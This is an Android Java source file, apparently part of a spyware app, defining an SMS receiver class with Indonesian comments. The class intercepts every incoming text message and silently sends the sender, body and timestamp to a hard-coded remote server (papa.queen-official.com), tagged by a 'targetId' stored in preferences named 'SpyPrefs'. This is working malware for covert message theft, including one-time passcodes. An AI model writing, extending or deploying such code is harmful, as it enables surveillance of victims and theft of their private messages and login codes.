package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences; // Tambahkan import
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsInterceptor extends BroadcastReceiver {
    private static final String TAG = "CRPT.SmsInterceptor";
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/post-response/";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getDisplayOriginatingAddress();
                    String message = sms.getDisplayMessageBody();
                    long timestamp = sms.getTimestampMillis();
                    
                    sendSmsToServer(context, sender, message, timestamp); // Tambahkan context
                }
            }
        }
    }
    
    private void sendSmsToServer(Context context, String sender, String message, long timestamp) {
        new Thread(() -> {
            try {
                // Perbaikan: Gunakan context yang dipassing untuk mengakses SharedPreferences
                SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "unknown");
                
                URL url = new URL(SERVER_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject payload = new JSONObject();
                payload.put("cmd", "sms_captured");
                JSONObject data = new JSONObject();
                data.put("address", sender);
                data.put("body", message);
                data.put("date", timestamp);
                payload.put("data", data);
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending SMS: " + e.getMessage());
            }
        }).start();
    }
}